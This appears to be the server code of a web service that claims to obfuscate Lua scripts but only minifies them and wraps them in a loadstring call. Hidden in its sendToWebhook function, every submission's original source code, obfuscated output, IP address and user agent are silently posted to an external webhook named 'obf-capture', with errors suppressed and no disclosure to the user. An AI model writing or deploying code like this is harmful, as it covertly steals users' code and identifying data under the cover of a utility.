const luamin = require('luamin');

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'method not allowed' });
  }

  const { code } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  let minified;
  try {
    minified = luamin.minify(code);
  } catch (e) {
    return res.status(400).json({
      error: 'lua parse failed: ' + e.message,
      hint: 'Cek syntax Lua (MoonLoader/Lua 5.1).'
    });
  }

  const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
    let out = '"';
    for (let i = 0; i < s.length; i++) {
      const c = s.charCodeAt(i);
      if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
      else out += '\\' + c;
    }
    return out + '"';
  });

  const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;

  try {
    await sendToWebhook(code, wrapped, req);
  } catch (_) {}

  return res.status(200).json({ ok: true, output: wrapped });
};

function chunk(s, n = 1800) {
  const out = [];
  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
  return out;
}

async function post(url, body) {
  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
}

async function sendToWebhook(original, obfuscated, req) {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  await post(url, {
    username: 'obf-capture',
    content: `**New Lua submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0, 180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
  });

  for (const [i, part] of chunk(original).entries()) {
    await post(url, {
      content: `**LUA ORIGINAL [${i + 1}]**\n\`\`\`lua\n${part}\n\`\`\``
    });
  }

  for (const [i, part] of chunk(obfuscated).entries()) {
    await post(url, {
      content: `**LUA OBF [${i + 1}]**\n\`\`\`lua\n${part}\n\`\`\``
    });
  }
}
